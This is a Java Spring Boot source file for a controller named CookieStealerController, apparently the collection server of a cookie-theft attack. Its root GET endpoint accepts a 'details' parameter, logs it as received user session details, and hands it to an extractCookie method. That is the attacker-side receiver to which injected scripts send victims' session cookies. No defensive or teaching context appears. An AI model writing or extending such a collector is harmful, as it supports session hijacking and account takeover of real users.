package com.app.cs.controller;

import com.app.cs.business.ICookieStealerBusiness;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@Slf4j
public class CookieStealerController {

    @Autowired
    private ICookieStealerBusiness cookieStealerBusiness;

    public CookieStealerController() {}

    @GetMapping ("/")
    public void serveRest(@RequestParam (defaultValue = "null") String details) {
        log.info("received user session details");
        cookieStealerBusiness.extractCookie(details);
    }
}
